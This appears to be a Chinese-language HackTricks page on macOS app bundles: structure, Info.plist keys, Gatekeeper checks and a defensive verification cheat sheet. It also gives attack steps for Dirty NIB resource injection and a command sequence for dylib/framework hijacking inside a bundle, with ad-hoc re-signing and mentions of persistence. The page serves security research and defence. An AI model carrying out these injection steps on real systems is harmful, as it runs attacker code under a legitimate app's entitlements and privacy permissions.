# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## 基本信息

macOS 中的 Bundles 充当各种资源的容器，包括应用程序、libraries 以及其他必要文件，使它们在 Finder 中显示为单个对象，例如常见的 `*.app` 文件。最常见的 Bundle 是 `.app` Bundle，不过 `.framework`、`.systemextension` 和 `.kext` 等其他类型也很常见。

### Bundle 的基本组件

在 Bundle 中，尤其是在 `<application>.app/Contents/` 目录内，存放着各种重要资源：

- **\_CodeSignature**：此目录存储用于验证应用程序完整性的代码签名信息。你可以使用以下命令检查代码签名信息：
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**：包含用户交互后运行的应用程序可执行二进制文件。
- **Resources**：应用程序用户界面组件的存储库，包括图像、文档和界面描述文件（nib/xib 文件）。
- **Info.plist**：作为应用程序的主要配置文件，对于系统正确识别并与应用程序交互至关重要。

#### Info.plist 中的重要键

`Info.plist` 文件是应用程序配置的基石，其中包含以下键：

- **CFBundleExecutable**：指定位于 `Contents/MacOS` 目录中的主可执行文件名称。
- **CFBundleIdentifier**：为应用程序提供全局标识符，macOS 广泛使用它来管理应用程序。
- **LSMinimumSystemVersion**：指示运行该应用程序所需的最低 macOS 版本。

### 探索 Bundles

要探索 bundle 的内容，例如 `Safari.app`，可以使用以下命令：`bash ls -lR /Applications/Safari.app/Contents`

该操作会显示 `_CodeSignature`、`MacOS`、`Resources` 等目录，以及 `Info.plist` 等文件。它们分别用于保护应用程序、定义用户界面和设置运行参数。

#### 其他 Bundle 目录

除常见目录外，bundles 还可能包含：

- **Frameworks**：包含应用程序使用的 bundled frameworks。Frameworks 类似于带有额外资源的 dylibs。
- **PlugIns**：用于存放增强应用程序功能的 plug-ins 和 extensions。
- **XPCServices**：存放应用程序用于进程外通信的 XPC services。

这种结构确保所有必要组件都封装在 bundle 中，从而实现模块化且安全的应用程序环境。

如需了解 `Info.plist` 键及其含义的更多详细信息，Apple developer documentation 提供了丰富的资源：[Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)。<sup>[[3]](#references)</sup>

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**：隔离的 bundle 首次执行时，macOS 会执行深度签名验证，并可能从随机化的 translocated path 运行它。接受后，后续启动只执行浅层检查；`Resources/`、`PlugIns/`、nibs 等资源文件在历史上不会被检查。自 macOS 13 Ventura 起，首次运行时会强制执行深度检查，并且新的 *App Management* TCC permission 会限制第三方进程在未经用户同意的情况下修改其他 bundles，但旧系统仍然存在漏洞。
- **Bundle Identifier collisions**：多个 embedded targets（PlugIns、helper tools）重复使用相同的 `CFBundleIdentifier`，可能破坏签名验证，并偶尔导致 URL-scheme hijacking/confusion。应始终枚举 sub-bundles 并验证其 ID 唯一。

## Resource Hijacking (Dirty NIB / NIB Injection)

在 Ventura 之前，替换已签名应用中的 UI 资源可以绕过浅层 code signing，并以该应用的 entitlements 执行代码。当前研究（2024）表明，这在 pre-Ventura 系统和未隔离的 builds 上仍然有效：<sup>[[1]](#references)[[2]](#references)</sup>

1. 将目标应用复制到可写位置（例如 `/tmp/Victim.app`）。
2. 将 `Contents/Resources/MainMenu.nib`（或 `NSMainNibFile` 中声明的任意 nib）替换为恶意 nib，使其实例化 `NSAppleScript`、`NSTask` 等对象。
3. 启动应用。恶意 nib 会在受害者的 bundle ID 和 entitlements 下执行（TCC grants、microphone/camera 等）。
4. Ventura+ 通过在首次启动时对 bundle 执行深度验证，并要求后续修改获得 *App Management* permission 来缓解该问题，因此 persistence 更加困难；但旧版 macOS 上的 initial-launch attacks 仍然适用。<sup>[[1]](#references)</sup>

最小恶意 nib payload 示例（使用 `ibtool` 将 xib 编译为 nib）：
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Bundle 内的 Framework / PlugIn / dylib Hijacking

由于 `@rpath` 查找会优先使用已捆绑的 Frameworks/PlugIns，因此，将恶意 library 放入 `Contents/Frameworks/` 或 `Contents/PlugIns/`，即可在主 binary 未启用 library validation 或 `LC_RPATH` 顺序较弱时，重定向加载顺序。

滥用 unsigned/ad-hoc bundle 时的典型步骤：
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
注意：
- 缺少 `com.apple.security.cs.disable-library-validation` 的 Hardened runtime 会阻止第三方 dylibs；先检查 entitlements。
- `Contents/XPCServices/` 下的 XPC services 通常会加载同级 frameworks——以类似方式 patch 它们的 binaries，可用于 persistence 或 privilege escalation 路径。

## 快速检查速查表
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## 参考资料

- [1] [将 process injection 带入视野：使用 nib 文件 exploit macOS apps（2024）](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB 与 bundle resource tampering write-up（2024）](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
- [3] [Apple Developer - Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)

{{#include ../../../banners/hacktricks-training.md}}
